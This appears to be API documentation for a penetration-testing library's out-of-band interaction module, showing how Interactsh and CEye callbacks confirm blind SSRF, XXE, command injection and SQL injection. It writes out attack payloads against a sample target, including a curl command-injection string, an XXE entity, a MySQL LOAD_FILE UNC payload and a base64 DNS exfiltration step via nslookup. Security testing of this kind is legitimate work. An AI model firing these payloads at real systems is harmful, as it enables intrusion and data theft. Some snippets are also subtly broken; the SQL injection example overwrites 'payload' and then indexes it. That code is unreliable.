# Out-of-Band (OOB) Testing

Out-of-band interaction detection for blind vulnerability testing.

## Module: `ofx.api.oob`

Provides OOB interaction platforms for detecting blind vulnerabilities like SSRF, XXE, and command injection.

## Platforms

### Interactsh

Open-source OOB interaction platform.

```python
from ofx.api.oob import InteractshClient

# Initialize client
client = InteractshClient()

# Get unique URL + flag
url, flag = client.build_request(method="https")
# Example: "https://cxxxxxxx.oast.me"

# Use URL in payload
payload = f"curl {url}/callback"

# Check for interactions
interactions = client.poll()
for interaction in interactions:
    print(f"Protocol: {interaction['protocol']}")
    print(f"Request: {interaction['raw-request']}")
```

**Methods**:
- `build_request()` - Generate URL + flag
- `poll()` - Fetch interactions
- `verify()` - Verify a specific flag was hit

### CEye

CEye.io OOB platform (requires API key).

```python
from ofx.api.oob import CEyeClient

# Initialize with API key
client = CEyeClient(token="your-api-key")
domain = client.getsubdomain()

# Use in payload
payload = f"ping -c 1 {domain}"

# Check for DNS queries
payload = client.build_request("test", type="dns")
if client.verify_request(payload["flag"], type="dns"):
    print("Vulnerable! Received DNS query")
```

**Methods**:
- `build_request()` - Generate URL + flag
- `verify_request()` - Check for callback
- `exact_request()` - Extract exfiltrated data
- `getsubdomain()` - Account subdomain

## Use Cases

### SSRF Detection

```python
from ofx.api.oob import InteractshClient

client = InteractshClient()
oob_url, flag = client.build_request(method="http")

# Test SSRF
import requests
requests.post(
    "http://target.com/api",
    json={"url": oob_url}
)

# Check for callback
if client.verify(flag):
    print("SSRF vulnerability confirmed!")
```

### XXE Detection

```python
from ofx.api.oob import CEyeClient

client = CEyeClient(token="...")
domain = client.getsubdomain()

# XXE payload
xxe_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{domain}/xxe">
]>
<data>&xxe;</data>
'''

# Send payload
requests.post("http://target.com/upload", data=xxe_payload)

# Check interactions
payload = client.build_request("xxe", type="http")
if client.verify_request(payload["flag"], type="http"):
    print("XXE vulnerability confirmed!")
```

### Command Injection

```python
from ofx.api.oob import InteractshClient

client = InteractshClient()
oob_url, flag = client.build_request(method="http")

# Command injection payload
payload = f"; curl {oob_url} ;"

# Test endpoint
requests.get(f"http://target.com/api?cmd={payload}")

# Verify execution
if client.verify(flag):
    print("Command injection confirmed!")
```

### Blind SQL Injection

```python
from ofx.api.oob import CEyeClient
import time

client = CEyeClient(token="...")
payload = client.build_request("sqli", type="dns")
domain = payload["url"]

# DNS exfiltration payload (MySQL)
payload = f"' OR (SELECT LOAD_FILE('\\\\\\\\{domain}\\\\test')) --"

# Send payload
requests.get(f"http://target.com/search?q={payload}")

# Wait for DNS query
time.sleep(2)

if client.verify_request(payload["flag"], type="dns"):
    print("Blind SQL injection confirmed!")
```

## Platform Comparison

| Feature | Interactsh | CEye |
|---------|------------|------|
| **Open Source** | ✅ Yes | ❌ No |
| **Self-hosted** | ✅ Yes | ❌ No |
| **API Key Required** | ❌ No | ✅ Yes |
| **DNS Support** | ✅ Yes | ✅ Yes |
| **HTTP Support** | ✅ Yes | ✅ Yes |
| **HTTPS Support** | ✅ Yes | ✅ Yes |
| **SMTP Support** | ✅ Yes | ❌ No |
| **FTP Support** | ❌ No | ✅ Yes |
| **Rate Limits** | Higher | Lower (free tier) |

## Best Practices

1. **Use Unique Identifiers**: Generate new URLs for each test
2. **Add Context**: Include identifiers in payloads for tracking
3. **Poll Regularly**: Check interactions periodically
4. **Cleanup**: Close clients when done
5. **Handle Rate Limits**: Respect platform limits

## Advanced Usage

### Custom Interactsh Server

```python
from ofx.api.oob import InteractshClient

# Use custom server
client = InteractshClient(server="your-server.com")
url, _ = client.build_request(method="http")
```

### Interaction Filtering

```python
from ofx.api.oob import InteractshClient

client = InteractshClient()
url, _ = client.build_request(method="http")

# Send payloads...

# Filter specific interaction types
dns_interactions = [
    i for i in client.poll()
    if i['protocol'] == 'dns'
]

http_interactions = [
    i for i in client.poll()
    if i['protocol'] == 'http'
]
```

### Data Exfiltration

```python
from ofx.api.oob import CEyeClient
import base64

client = CEyeClient(token="...")
domain = client.getsubdomain()

# Exfiltrate data via DNS subdomain
data = "sensitive_data"
encoded = base64.b64encode(data.encode()).decode()
exfil_domain = f"{encoded}.{domain}"

# Trigger DNS query with data
payload = f"nslookup { exfil_domain}"

# Retrieve data from interactions
payload = client.build_request(encoded, type="dns")
if client.verify_request(payload["flag"], type="dns"):
    exfiltrated = client.exact_request(payload["flag"], type="dns")
    if exfiltrated:
        print(f"Exfiltrated: {exfiltrated}")
```

## See Also

- [Exploitation API](../exploitation.md)
- [HTTP API](../exploitation/http.md)
